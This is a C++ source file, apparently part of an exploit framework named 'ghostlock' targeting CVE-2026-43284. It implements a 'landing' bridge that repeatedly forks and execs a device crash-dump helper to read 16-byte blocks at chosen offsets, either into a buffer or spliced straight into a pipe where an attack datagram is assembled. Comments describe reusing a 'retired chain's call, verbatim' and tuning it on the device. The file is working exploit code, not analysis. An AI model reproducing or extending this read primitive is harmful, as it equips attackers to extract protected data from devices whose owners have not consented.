/** @file backend/cve_2026_43284/landing/crash_dump_bridge.cpp
 *  The exec, and the two ways its output is used.
 */
#include "backend/cve_2026_43284/landing/crash_dump_bridge.hpp"

#include <cerrno>
#include <cstdio>
#include <cstring>

#include <sys/wait.h>
#include <unistd.h>

namespace ghostlock::backend::cve_2026_43284::landing {
    namespace {
        /** Copy a path in, or refuse: these strings become argv, and a truncated argv is a
         *  different command. */
        bool take_path(char *out, std::size_t capacity, const char *path,
                       std::size_t length) noexcept {
            if (path == nullptr || length == 0U || length + 1U > capacity) {
                return false;
            }
            for (std::size_t i = 0U; i < length; ++i) {
                const char c = path[i];
                if (c == '\0' || c == ' ' || c == '\t' || c == '\n' || c == '\r') {
                    return false;
                }
            }
            std::memcpy(out, path, length);
            out[length] = '\0';
            return true;
        }
    }  // namespace

    bool CrashDumpBridge::bind(const char *helper_path, std::size_t helper_bytes,
                               const char *carrier_path, std::size_t carrier_bytes) noexcept {
        bound_ = take_path(helper_, sizeof(helper_), helper_path, helper_bytes) &&
                 take_path(carrier_, sizeof(carrier_), carrier_path, carrier_bytes);
        if (!bound_) {
            outcome_ = Outcome::NotBound;
        }
        return bound_;
    }

    long CrashDumpBridge::read16(void *ctx, std::uint64_t offset,
                                 std::uint8_t out[kBlockBytes]) noexcept {
        auto *const self = static_cast<CrashDumpBridge *>(ctx);
        if (self == nullptr) {
            return -1;
        }
        /* A pipe of our own: the helper's stdout comes here and this side reads the block. */
        return self->run(offset, -1, out);
    }

    long CrashDumpBridge::splice16(void *ctx, int pipe_write_fd, std::uint64_t offset) noexcept {
        auto *const self = static_cast<CrashDumpBridge *>(ctx);
        if (self == nullptr) {
            return -1;
        }
        /* The caller's pipe is the helper's stdout: whatever the helper writes lands where the
         * datagram is being assembled, so no block travels through this process at all. */
        return self->run(offset, pipe_write_fd, nullptr);
    }

    long CrashDumpBridge::run(std::uint64_t offset, int sink_stdout, std::uint8_t *out) noexcept {
        if (!bound_) {
            outcome_ = Outcome::NotBound;
            return -1;
        }
        int fds[2] = {-1, -1};
        if (::pipe(fds) != 0) {
            outcome_ = Outcome::PipeFailed;
            return -1;
        }
        char offset_text[32] = {};
        (void) std::snprintf(offset_text, sizeof(offset_text), "%llu",
                             static_cast<unsigned long long>(offset));
        const pid_t child = ::fork();
        if (child < 0) {
            (void) ::close(fds[0]);
            (void) ::close(fds[1]);
            outcome_ = Outcome::SpawnFailed;
            return -1;
        }
        if (child == 0) {
            /* In the child: the block must come out of standard output, so that is where the pipe
             * goes -- ours for a read, the caller's datagram pipe for a write. The helper takes
             * {offset, path, "r"}: the same three arguments the retired chain passed. */
            const int sink = sink_stdout >= 0 ? sink_stdout : fds[1];
            if (::dup2(sink, STDOUT_FILENO) < 0) {
                ::_exit(127);
            }
            (void) ::close(fds[0]);
            if (fds[1] >= 0) {
                (void) ::close(fds[1]);
            }
            /* The retired chain's call, verbatim: argv[0] is the name the helper expects and the
             *  two arguments are {offset, path}. A third argument, or the full path as argv[0], makes
             *  the helper read nothing -- measured on the device. */
            ::execl(helper_, "crashdump64", offset_text, carrier_, static_cast<char *>(nullptr));
            ::_exit(127);
        }
        /* In the parent: only the end that carries the block stays open. */
        (void) ::close(fds[1]);
        long got = (sink_stdout >= 0) ? static_cast<long>(kBlockBytes) : 0;
        if (sink_stdout < 0) {
            got = 0;
            while (got < static_cast<long>(kBlockBytes)) {
                const ssize_t n =
                    ::read(fds[0], out + got, kBlockBytes - static_cast<std::size_t>(got));
                if (n < 0) {
                    if (errno == EINTR) {
                        continue;
                    }
                    got = -errno;
                    break;
                }
                if (n == 0) {
                    break;
                }
                got += static_cast<long>(n);
            }
        }
        (void) ::close(fds[0]);
        int status = 0;
        for (;;) {
            const pid_t reaped = ::waitpid(child, &status, 0);
            if (reaped == child) {
                break;
            }
            if (reaped < 0 && errno != EINTR) {
                last_status_ = -1;
                outcome_ = Outcome::SpawnFailed;
                return -1;
            }
        }
        last_status_ = status;
        /* The helper's own convention, kept from the retired chain: exit code zero means it moved
         * the whole block. A helper that wrote sixteen bytes and then failed is still a failure,
         * because nothing says the bytes it wrote are the page. */
        const bool clean = WIFEXITED(status) && WEXITSTATUS(status) == 0;
        /* The helper's verdict comes first: a helper that failed is a failed helper even when it
         * also wrote short, and the two are different faults to act on. */
        if (!clean) {
            outcome_ = Outcome::HelperFailed;
            return -1;
        }
        if (sink_stdout < 0 && got != static_cast<long>(kBlockBytes)) {
            outcome_ = Outcome::ShortRead;
            return got < 0 ? got : -1;
        }
        outcome_ = Outcome::Ok;
        return static_cast<long>(kBlockBytes);
    }
}  // namespace ghostlock::backend::cve_2026_43284::landing
